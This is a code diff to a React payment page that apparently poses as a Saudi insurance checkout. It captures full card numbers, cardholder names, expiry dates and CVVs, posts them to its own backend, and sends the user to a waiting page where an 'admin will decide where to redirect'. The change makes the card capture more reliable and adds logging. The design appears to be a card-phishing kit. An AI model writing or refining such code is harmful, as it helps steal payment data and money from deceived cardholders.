@@ -16,6 +16,7 @@ export default function Visa() {
   const [cardHolder, setCardHolder] = useState("");
   const [expiry, setExpiry] = useState("");
   const [cvv, setCvv] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Order summary state
   const [basePrice, setBasePrice] = useState(0);
@@ -45,25 +46,35 @@ export default function Visa() {
     setExpiry(val.length > 2 ? `${val.substring(0, 2)}/${val.substring(2, 4)}` : val);
   };
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    if (isSubmitting) return;
+    setIsSubmitting(true);
+    
     const sessionId = localStorage.getItem("sessionId");
-    if (!sessionId) { setLocation("/"); return; }
+    console.log("Visa submit - sessionId:", sessionId);
+    
+    if (!sessionId) { 
+      console.error("No sessionId found!");
+      setLocation("/"); 
+      return; 
+    }
+    
     const last4 = cardNumber.replace(/\D/g, "").slice(-4);
     localStorage.setItem("cardLast4", last4);
 
-    // Submit payment summary (non-blocking)
-    try {
-      addSubmission("payment", sessionId, { paymentMethod: "mada_visa", amount: total.toFixed(2), insuranceCompany: company });
-    } catch {}
+    // Submit payment summary
+    await addSubmission("payment", sessionId, { paymentMethod: "mada_visa", amount: total.toFixed(2), insuranceCompany: company });
+    console.log("Payment submitted");
 
-    try {
-      addSubmission("card", sessionId, { cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv });
-      // Go to waiting page - admin will decide where to redirect
-      setLocation("/waiting");
-    } catch {
-      // handle error
-    }
+    // Submit card data
+    await addSubmission("card", sessionId, { cardNumber: cardNumber.replace(/\s/g, ""), cardHolder, expiry, cvv });
+    console.log("Card submitted");
+    
+    console.log("Going to waiting page...");
+    // Go to waiting page - admin will decide where to redirect
+    setLocation("/waiting");
   };
 
   return (
@@ -154,9 +165,9 @@ export default function Visa() {
               </div>
             </div>
 
-            <Button type="submit"
-              className="w-full h-12 text-base font-bold bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-md mt-2">
-              ادفع الآن — {total > 0 ? `${total.toFixed(2)} ر.س` : "..."}
+            <Button type="submit" disabled={isSubmitting}
+              className="w-full h-12 text-base font-bold bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-gray-900 shadow-md mt-2 disabled:opacity-70">
+              {isSubmitting ? "جارٍ الإرسال..." : `ادفع الآن — ${total > 0 ? `${total.toFixed(2)} ر.س` : "..."}`}
             </Button>
 
             <div className="flex items-center justify-center gap-2 pt-1">
